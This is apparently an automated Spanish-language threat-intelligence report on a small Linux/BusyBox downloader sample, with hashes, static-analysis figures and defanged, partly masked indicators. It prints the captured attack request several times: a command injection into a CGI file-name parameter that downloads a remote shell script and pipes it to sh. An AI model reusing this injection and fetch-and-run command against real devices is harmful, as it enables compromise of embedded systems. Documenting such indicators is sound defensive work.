# 🧬 Payload Analysis

`dbd860275ac4fcba1ea75334e568d46cf3de4b5694a89dace13f388ba3525bce`

## 📌 Resumen

Texto ASCII de 253 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `wget hxxp://91.92.40.XXX/wget.sh -O-`
2. `sh -s toto5`
3. `busybox wget hxxp://91[.]92[.]` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Perfil técnico:** `Linux / BusyBox`, compatible con sistemas embebidos o IoT. BusyBox se trata como indicio de plataforma y no como prueba suficiente de que el dispositivo sea IoT. **Ficha malware:** [malware-like/oraculo/downloader/dbd860275ac4fcba1ea75334e568d46cf3de4b5694a89dace13f388ba3525bce.md](../../../../../malware-like/oraculo/downloader/dbd860275ac4fcba1ea75334e568d46cf3de4b5694a89dace13f388ba3525bce.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:45:45.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `dbd860275ac4fcba1ea75334e568d46cf3de4b5694a89dace13f388ba3525bce`
- **MD5:** `2d5a9e0e954018eaa865b14fc6cad05b`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 253 B |
| Entropía | 5.08 |
| Strings | 3 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
GET /cgi-bin/downloadFlile.cgi?name=`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s toto5;busybox wget hxxp://91[.]92[.]
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| ip | 190.179.168.XXX | static_analysis |
| ip | 91.92.40.XXX | static_analysis |
| command | GET /cgi-bin/downloadFlile.cgi?name=`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s toto5;busybox wget hxxp://91[.]92[.] | strings |
| hash | dbd860275ac4fcba1ea75334e568d46cf3de4b5694a89dace13f388ba3525bce | static_analysis |
| ip | 45.156.87.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
